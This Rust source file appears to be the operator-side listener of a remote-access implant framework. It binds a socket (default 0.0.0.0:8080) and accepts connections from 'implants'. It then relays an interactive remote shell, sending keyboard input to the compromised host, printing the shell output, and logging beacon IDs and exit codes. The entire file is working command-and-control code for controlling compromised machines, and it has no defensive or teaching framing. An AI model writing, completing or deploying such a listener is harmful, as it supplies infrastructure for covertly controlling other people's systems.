/* Documntation:
operator side runs on laptop.
bind -> listen -> accept loop one implant at a time for v0.1.
*/

use ravenna::frame;
use ravenna::proto::{Envelope, ShellData, envelope};
use ravenna::socket::{Sock, SockRole};
use std::sync::Arc;

fn _handle(_c: Sock) {
    let _c = Arc::new(_c);

    // socket -> stdout, blocks on recv_msg
    let _s1 = _c.clone();
    let _t1 = std::thread::spawn(move || {
        loop {
            match frame::recv_msg(&_s1) {
                Some(_env) => match _env.m {
                    Some(envelope::M::D(_d)) => unsafe {
                        libc::write(
                            1,
                            _d.chunk.as_ptr() as *const std::ffi::c_void,
                            _d.chunk.len() as libc::size_t,
                        );
                    },
                    Some(envelope::M::E(_e)) => {
                        eprintln!("\nshell exited code={}", _e.code);
                        break;
                    }
                    Some(envelope::M::B(_b)) => {
                        eprintln!("\nbeacon id={}", _b.implant_id);
                    }
                    _ => {}
                },
                None => {
                    eprintln!("\nimplant went away.");
                    break;
                }
            }
        }
    });

    // stdin -> socket, blocks on stdin read
    let _s2 = _c.clone();
    loop {
        let mut _in = [0u8; 4096];
        let _n: isize = unsafe {
            libc::read(
                0,
                _in.as_mut_ptr() as *mut std::ffi::c_void,
                _in.len() as libc::size_t,
            )
        };
        if _n <= 0 {
            break;
        }
        frame::send_msg(
            &_s2,
            &Envelope {
                m: Some(envelope::M::D(ShellData {
                    chunk: _in[.._n as usize].to_vec(),
                })),
            },
        );
    }

    unsafe {
        libc::shutdown(_c.fd(), libc::SHUT_RDWR);
    }
    let _ = _t1.join();
}

fn main() {
    let _args: Vec<String> = std::env::args().collect();
    let _iface = _args.get(1).cloned().unwrap_or("0.0.0.0".to_string());
    let _port: u16 = _args.get(2).and_then(|_p| _p.parse().ok()).unwrap_or(8080);

    let _listener: Sock = Sock::new(SockRole::Server {
        interface: _iface.clone(),
        port: _port,
        backlog: 5,
    });
    eprintln!("server listening on {_iface}:{_port} ...");

    loop {
        let _c = _listener.accept();
        eprintln!("got implant!");
        _handle(_c);
        eprintln!("waiting for next implant ...");
    }
}
